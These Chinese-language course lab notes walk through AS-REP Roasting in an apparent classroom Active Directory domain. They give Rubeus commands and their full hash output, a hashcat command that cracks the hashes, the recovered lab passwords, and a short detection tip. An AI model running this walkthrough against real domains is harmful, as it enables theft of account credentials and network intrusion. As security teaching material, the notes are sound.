---
title: NTUSTISC - AD Note - Lab(AS-REP Roasting)
tags: [NTUSTISC, AD, information security]

category: "Security/Course/NTUST ISC/AD/3. 更多密碼"
---

# NTUSTISC - AD Note - Lab(AS-REP Roasting)
<!-- more -->
[TOC]

Lecture Video: [ 2022/05/11 AD 安全 2 ](https://youtu.be/ubNMQ7_dcm0?si=CRVWKo4tnpx3LqxK)

## Background
[第十四章 Kerberos 認證系統](https://www.tsnien.idv.tw/Security_WebBook/chap14/14-4%20Kerberos%20%E8%AA%8D%E8%AD%89%E7%B3%BB%E7%B5%B1%E7%B0%A1%E4%BB%8B.html)
* 簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分
* 提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章[^feifei-ad-kerberos-1][^feifei-ad-kerberos-2]，然後自行比對粘添壽老師的影片
* MIT Kerberos架構：
    ![](https://www.tsnien.idv.tw/Security_WebBook/Security_%E6%8F%92%E5%9C%96/%E5%9C%96%2014-8.png)
    為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便
* Windows Kerberos架構：
    ![](https://hackmd.io/_uploads/BkTzOxN1T.png)
* 優點
    > * 主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。
    > * 客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。
    > * 防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。
    > * 防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。


## Lab

### ==AS-REP Roasting==
* 攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer
    ![](https://hackmd.io/_uploads/H1JCrlEyT.png)
    在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket
    ![](https://hackmd.io/_uploads/BJidLxV1a.png)
    雖然預設是不勾選，但有兩種情況會打勾
    1. 如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號)
    2. 因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生
* 滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting
* 如何攻擊：
    * 自己把Microsoft的document看懂如何pack一個packet，然後自己實作
    * 另一種方式就直接用工具[Rubeus 1.6.4](https://github.com/GhostPack/Rubeus/releases/tag/1.6.4)，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來
    * Cheat Sheet:
    ```bash
    $ Rubeus.exe asreproast
    $ Rubeus.exe asreproast /format:hashcat /outfile:out.txt
    ```
---

#### 實際執行
1. Using Rubeus.exe
:::spoiler Result
```bash!
$ Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain          : kuma.org

[*] Searching path 'LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org' for AS-REP roastable users
[*] SamAccountName         : reyna.gwendolyn
[*] DistinguishedName      : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: 'kuma.org\reyna.gwendolyn'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6
      B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918
      C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053
      AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116
      934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E
      859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D
      9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9

[*] SamAccountName         : henrieta.sabine
[*] DistinguishedName      : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: 'kuma.org\henrieta.sabine'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550
      A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B
      B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365
      68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B
      241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B
      93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E
      CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856

[*] SamAccountName         : giulietta.moyra
[*] DistinguishedName      : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: 'kuma.org\giulietta.moyra'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60
      5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C
      2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C
      1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4
      1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0
      7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297
      357047776932B4EA2405ECB5705418BDE7CB8DBE725BB
```
:::
可以看到他總共吐出了三個hash，分別對應到三個使用者：<font color="FF0000">reyna.gwendolyn, henrieta.sabine, henrieta.sabine</font>，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開

2. Using Hashcat
可以直接在Kali使用hashcat，不過我是直接在windows上操作，可以參考[^hashcat-instruction]，講解的非常詳細
```bash!
$ hashcat.exe -m 18200 -a 3 ".\Kerberos-AS-REP.txt" -o output.txt
```

Output Result
```bash!
$krb5asrep$23$giulietta.moyra@kuma.org:eb292e4b9e547357db6500d982df775b$2def9955e12f072fdc189adcde61dbff3939f7cfda5c84583c78335edfff1c5d246e3c311b991e26c0ca7afbb97757a2751a521b596e9da9a3ffcbec31205b61e45473cfbff58046f5a9759aa186ebbb90894749b2f0cbd91d6558e8f0750aab7c0b46d8947f843327f9dceb94c4b4043ee902856f3c01493e353c28cd956aaa0c58c6ded536e11855d4584aeed3486e379f91199eb96808631f2b72f0443e637cc66268bc8dd87528daf96b28de8fbccae28aa52b38f5069e5aa2c9b4dd9e21ed77ac30d6602459376a8a791d133f577024c43cae1ac8bd973d39e191ba535c0f660b0e:willow
$krb5asrep$23$reyna.gwendolyn@kuma.org:ef97037a66f7cedcacf9aeae90e8d8cc$930cc1157dfee8d506c728f11184963e4011a0254ea83428aaf529de9c2a10c533ff12c0b6f519aad9c65a7fa6a645e6552f57936001c8b8011bbf1f3f93981bd6126befb0dd74b1df7930336f240f623d1d9e53bbb5e37864559d37ee3f1a0edd319a7252a3b6bab5b50d81967abc630eccb804dd200218b7222914776d71387c2916353c3475426515aaa5b95108b9e9ae68c8ece2dfeeaf7836dd9f3778c49c4090850925332470b9eab9c77c4549237a17f58e41b0b09a1be6a99827f5b14d78a734300bb08056c40a28b6f69fa2c7b72afa7d18d831631b19b7cbcc5a6dc928d66d:edward
$krb5asrep$23$henrieta.sabine@kuma.org:cef1cda05e49376d4749ace914595ea1$43d6d77a9de81c2e1c6a00fd7ea6bbb2dc087e26568ae31ab08f2b6887ccfa427ca59fab8dd7bd69d3c2b13b5f1c4ec2dff56f975940d1096eac8bca440c5adafa49e5e8b57d3cc7fddf83a71fef5353a3e3e2a85a6269a39a007bd5272ef40ba721b30313a2054d684e8efe81b214a79af9e1d5d75b1746070486a0d90e79123d1c881a56d190a7c76f1ad951695faee37f64f7f063fd38f2d7af0476747d10c5d16540c34396a0e752aaa820b4147396829affd62b99de0fa6fd0fba13a5271d5fd8b6484a7e9ef52526d0b6cef84f1ab4c939dc977e967bd12c98ca6fb55508d1a770:therock
```
這三者的密碼就被爆出來了，分別是
giulietta.moyra$\to$willow
reyna.gwendolyn$\to$edward
henrieta.sabine$\to$therock

#### ==How to detect it?==
Event ID: 4768(預設不開，因為在一般中大型公司中，開了這個所收到的event會超多，所以除非做好filter不然一般不開)

## Reference
[^feifei-ad-kerberos-1]:[AD Security - [Day7] 一起來學 AD 安全吧！：AD 驗證協定 Kerberos (1) ](https://ithelp.ithome.com.tw/articles/10296583)
[^feifei-ad-kerberos-2]:[AD Security - [Day8] 一起來學 AD 安全吧！：AD 驗證協定 Kerberos (2) ](https://ithelp.ithome.com.tw/articles/10297185)
[^hashcat-instruction]:[【教學】密碼恢復工具 Hashcat簡易基本教學(windows7/10)](https://home.gamer.com.tw/creationDetail.php?sn=3669363)